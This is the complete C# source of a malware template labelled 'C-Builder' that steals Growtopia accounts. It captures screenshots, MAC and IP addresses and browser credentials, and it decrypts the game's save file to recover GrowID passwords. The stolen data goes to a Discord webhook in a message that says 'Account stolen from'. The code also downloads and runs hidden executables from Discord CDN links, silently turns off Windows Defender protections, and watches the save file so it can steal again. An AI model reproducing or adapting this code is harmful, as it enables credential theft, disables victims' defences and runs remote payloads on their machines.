using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.Security.Principal;

namespace C_Builder
{
    class Program
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        static void Main()
        {
            WebClient wc = new WebClient();

            Process.Start("//siteopener");

            //corruptgt

            //diswin

            //disablemanager

            //errormessage

            //startupxd

            //hidestealergobrrr

            string key = "kljsdooqlo4454GG";
            string savedat = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
            string picFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

            try
            {
                StreamWriter maczzz = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
                foreach (NetworkInterface bok in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = string.Join("", bok.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2")));
                    maczzz.Write(mac + "                                                                                                                               ");
                }
                maczzz.Close();
            }
            catch
            {
            }

            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png");  // saves the image
                }
            }
            catch
            {
                File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png");
            }

            bool sendAttachments = true;
            string macLocation = ("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
            string IP = GrabIP();
            string macs = File.ReadAllText(macLocation);
            string str = Environment.ExpandEnvironmentVariables("%TEMP%");
            string savepath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
            string zipPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + " pictures.zip";
            string screenshot = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png";
            string contents = RetrivePass();
            File.WriteAllText(str + "\\" + Environment.UserName + " credentials.txt", contents);
            string browsercredpath = str + "\\" + Environment.UserName + " credentials.txt";

            dWebHook webHook = new dWebHook();
            webHook.WebHook = DecryptString(key, "//webhook url");

            //screenshot

            try
            {
                File.Delete(Path.GetTempPath() + "//pwd.txt");
                File.Delete(Path.GetTempPath() + "//savedecoder.exe");
                File.Delete(Path.GetTempPath() + Environment.UserName + ".txt");
            }
            catch
            {

            }

            try
            {
                wc.DownloadFile("https://cdn.discordapp.com/attachments/775300885990998059/775459023562473512/savedecrypter.exe", Path.GetTempPath() + "//savedecoder.exe");
                ProcessStartInfo info = new ProcessStartInfo();
                info.WindowStyle = ProcessWindowStyle.Hidden;
                info.FileName = Path.GetTempPath() + "//savedecoder.exe";
                Process.Start(info);

                Thread.Sleep(1000);

                string dat = File.ReadAllText(Path.GetTempPath() + "//pwd.txt");
                string[] array = File.ReadAllText(Path.GetTempPath() + "\\pwd.txt").Split(new char[]
                {
                '='
                });
                string growid = array[0];
                string passwords = array[1];
                string lastworld = array[2];

                File.Delete(Path.GetTempPath() + "//pwd.txt");
                File.Delete(Path.GetTempPath() + "//savedecoder.exe");

                //browsercreds

                webHook.AddAttachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat", Environment.UserName + ".dat");

                webHook.SendMessageWithAttachment("```asciidoc\n" + "[C-Builder] Account stolen from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);

                if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                    File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
                if (File.Exists(macLocation))
                    File.Delete(macLocation);
                if (File.Exists(screenshot))
                    File.Delete(screenshot);

                //deletegt

                //tracer

                //BSOD
            }
            catch
            {

            }

            wc.DownloadFile("https://cdn.discordapp.com/attachments/775273209100501013/775278243318071296/Services.exe", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Services.exe");
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.WindowStyle = ProcessWindowStyle.Hidden;
            proc.FileName = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Services.exe";
            Process.Start(proc);
        }
        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        public static string PasteStealer(string encrypted)
        {
            string xddddasfasf = "aoI90PeaapejpsOP";
            string lmaoohehejasd = "Oi09ajhiplK0hip0goidp0jkduewsp0a";

            byte[] array = Convert.FromBase64String(encrypted);
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            rijndaelManaged.BlockSize = 128;
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.Key = Encoding.UTF8.GetBytes(lmaoohehejasd);
            rijndaelManaged.IV = Encoding.UTF8.GetBytes(xddddasfasf);
            rijndaelManaged.Padding = PaddingMode.PKCS7;
            rijndaelManaged.Mode = CipherMode.CBC;
            using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV))
            {
                byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
                return Encoding.Unicode.GetString(bytes);
            }
        }
        private static string RetrivePass()
        {
            string text = Environment.ExpandEnvironmentVariables("%TEMP%");
            WebClient webClient = new WebClient();
            webClient.DownloadFile(PasteStealer("CW/PsKH5sxTA0WGmJaxxW1ML+wT8q90jrto/c7dDT2qpe/RLNvNoRsub28By1W82Y2d0V7rQGgEj9trh+a3AIbT/Z2/izeQvy1ntGG4lya3YSpfVpW8G+500Yecb6tYEBQuTV4kkvzbjp5q8276S65gwBQJ/dFTo2ruNnKyOV6PDfRtZ5UzH106UnQJbdjKMh/1ZVkmMjpDP8KWIUprbn7srzcR+qmWhfNc9ruueUTBIud63/BuLPxaT9QdzG1j6eP4Mc7Wj0sB784SXWjm6gQ=="), text + "\\resourcefilehaha.exe");
            webClient.Dispose();
            Process process = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.FileName = text + "\\resourcefilehaha.exe";
            processStartInfo.Arguments = "/C /stext " + text + "\\credentialslmao.txt";
            ProcessStartInfo processStartInfo3 = process.StartInfo = processStartInfo;
            process.Start();
            Thread.Sleep(500);
            File.Delete(text + "\\resourcefilehaha.exe");
            string result = File.ReadAllText(text + "\\credentialslmao.txt");
            File.Delete(text + "\\credentialslmao.txt");
            return result;
        }

        static string GrabIP()
        {
            WebClient wc = new WebClient();
            string ip = wc.DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }
        public static string EncryptString(string key, string plainText)
        {
            byte[] iv = new byte[16];
            byte[] array;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }

        public static string DecryptString(string key, string cipherText)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static MultipartFormDataContent content = new MultipartFormDataContent();
        private static List<string> filelist = new List<string>();
        public string WebHook { get; set; }

        public dWebHook()
        {
            dWebClient = new WebClient();
        }


        public void SendMessage(string msgSend, string file = null, string filename = null)
        {
            if (file != null)
            {
                byte[] bytes = File.ReadAllBytes(file);
                if (filename != null)
                {
                    content.Add(new ByteArrayContent(bytes), filename, filename);
                }
                else
                {
                    throw new Exception(@"You didn't define filename.. format: ""*.txt""");
                }
            }
            HttpClient client = new HttpClient();
            content.Add(new StringContent(msgSend), "content");
            var result = client.PostAsync(WebHook, content).Result;
            Console.WriteLine(result);
        }
        public void AddAttachment(string file, string filename)
        {
            byte[] bytes = File.ReadAllBytes(file);
            filelist.Add(Encoding.Default.GetString(bytes) + "-###Split###-" + filename);
        }
        public void SendMessageWithAttachment(string msgSend, bool attachments)
        {
            if (attachments)
            {
                foreach (string fileandname in filelist)
                {
                    string[] both = fileandname.Split(new string[] { "-###Split###-" }, StringSplitOptions.None);
                    byte[] file = Encoding.Default.GetBytes(both[0]);
                    string name = both[1];
                    content.Add(new ByteArrayContent(file), name, name);
                }
            }
            HttpClient client = new HttpClient();
            content.Add(new StringContent(msgSend), "content");
            var result = client.PostAsync(WebHook, content).Result;
            Console.WriteLine(result);
        }

        public void Dispose()
        {
            dWebClient.Dispose();
        }
    }
    class Tracer
    {
        public static string key = "kljsdooqlo4454GG";
        public static string dirPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia";
        public static string savePath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        public static void TraceSave()
        {
            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
        private static void OnSaveChanged(object source, FileSystemEventArgs e)
        {
            try
            {
                StreamWriter maczzz = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
                foreach (NetworkInterface bok in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = string.Join("", bok.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2")));
                    maczzz.Write(mac + "                                                                                                                               ");
                }
                maczzz.Close();
            }
            catch
            {
            }

            if (e.FullPath == savePath)
            {
                try
                {
                    try
                    {
                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        using (Graphics g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                            bmp.Save("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot2.png");  // saves the image
                        }
                    }
                    catch
                    {
                        File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot2.png");
                    }
                    try
                    {
                        bool sendAttachments = true;
                        WebClient wc = new WebClient();
                        string macLocation = ("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
                        string IP = GrabIP();
                        string macs = File.ReadAllText(macLocation);
                        string str = Environment.ExpandEnvironmentVariables("%TEMP%");
                        string savepath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
                        string zipPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + " pictures.zip";
                        string screenshot = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png";
                        string contents = RetrivePass();
                        File.WriteAllText(str + "\\" + Environment.UserName + " credentials.txt", contents);
                        string browsercredpath = str + "\\" + Environment.UserName + " credentials.txt";

                        dWebHook webHook = new dWebHook();
                        webHook.WebHook = DecryptString(key, "//webhook url");

                        //screenshot

                        try
                        {
                            File.Delete(Path.GetTempPath() + "//pwd.txt");
                            File.Delete(Path.GetTempPath() + "//savedecoder.exe");
                            File.Delete(Path.GetTempPath() + Environment.UserName + ".txt");
                        }
                        catch
                        {

                        }

                        wc.DownloadFile("https://cdn.discordapp.com/attachments/775300885990998059/775459023562473512/savedecrypter.exe", Path.GetTempPath() + "//savedecoder.exe");
                        ProcessStartInfo info = new ProcessStartInfo();
                        info.WindowStyle = ProcessWindowStyle.Hidden;
                        info.FileName = Path.GetTempPath() + "//savedecoder.exe";
                        Process.Start(info);

                        Thread.Sleep(1000);

                        string dat = File.ReadAllText(Path.GetTempPath() + "//pwd.txt");
                        string[] array = File.ReadAllText(Path.GetTempPath() + "\\pwd.txt").Split(new char[]
                        {
                            '='
                        });
                        string growid = array[0];
                        string passwords = array[1];
                        string lastworld = array[2];

                        File.Delete(Path.GetTempPath() + "//pwd.txt");
                        File.Delete(Path.GetTempPath() + "//savedecoder.exe");

						//browsercreds

						try
						{
                            webHook.AddAttachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat", Environment.UserName + ".dat");

                            webHook.SendMessageWithAttachment("```asciidoc\n" + "[C-Builder] Account traced from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);

                            if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                                File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
                            if (File.Exists(macLocation))
                                File.Delete(macLocation);
                            if (File.Exists(zipPath))
                                File.Delete(zipPath);
                            if (File.Exists(screenshot))
                                File.Delete(screenshot);
                        }
						catch
						{
                            if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                                File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
                            if (File.Exists(macLocation))
                                File.Delete(macLocation);
                            if (File.Exists(zipPath))
                                File.Delete(zipPath);
                            if (File.Exists(screenshot))
                                File.Delete(screenshot);
                        }
                    }
                    catch
                    {
                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
        public static string RetrivePass()
        {
            string text = Environment.ExpandEnvironmentVariables("%TEMP%");
            WebClient webClient = new WebClient();
            webClient.DownloadFile(PasteStealer("CW/PsKH5sxTA0WGmJaxxW1ML+wT8q90jrto/c7dDT2qpe/RLNvNoRsub28By1W82Y2d0V7rQGgEj9trh+a3AIbT/Z2/izeQvy1ntGG4lya3YSpfVpW8G+500Yecb6tYEBQuTV4kkvzbjp5q8276S65gwBQJ/dFTo2ruNnKyOV6PDfRtZ5UzH106UnQJbdjKMh/1ZVkmMjpDP8KWIUprbn7srzcR+qmWhfNc9ruueUTBIud63/BuLPxaT9QdzG1j6eP4Mc7Wj0sB784SXWjm6gQ=="), text + "\\resourcefilehaha.exe");
            webClient.Dispose();
            Process process = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.FileName = text + "\\resourcefilehaha.exe";
            processStartInfo.Arguments = "/C /stext " + text + "\\credentialslmao.txt";
            ProcessStartInfo processStartInfo3 = process.StartInfo = processStartInfo;
            process.Start();
            Thread.Sleep(500);
            File.Delete(text + "\\resourcefilehaha.exe");
            string result = File.ReadAllText(text + "\\credentialslmao.txt");
            File.Delete(text + "\\credentialslmao.txt");
            return result;
        }
        public static string PasteStealer(string encrypted)
        {
            string xddddasfasf = "aoI90PeaapejpsOP";
            string lmaoohehejasd = "Oi09ajhiplK0hip0goidp0jkduewsp0a";

            byte[] array = Convert.FromBase64String(encrypted);
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            rijndaelManaged.BlockSize = 128;
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.Key = Encoding.UTF8.GetBytes(lmaoohehejasd);
            rijndaelManaged.IV = Encoding.UTF8.GetBytes(xddddasfasf);
            rijndaelManaged.Padding = PaddingMode.PKCS7;
            rijndaelManaged.Mode = CipherMode.CBC;
            using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV))
            {
                byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
                return Encoding.Unicode.GetString(bytes);
            }
        }
        public static string DecryptString(string key, string cipherText)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
        static string GetHWID()
        { // Grab Hardware ID | (HWID)
            string CMD = "wmic csproduct get UUID";
            var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
            {
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            var proc = new Process()
            {
                StartInfo = procStartInfo
            };
            proc.Start();
            return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
        }
        static string GrabIP()
        {
            WebClient wc = new WebClient();
            string ip = wc.DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }
        public static string EncryptString(string key, string plainText)
        {
            byte[] iv = new byte[16];
            byte[] array;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }
    }
}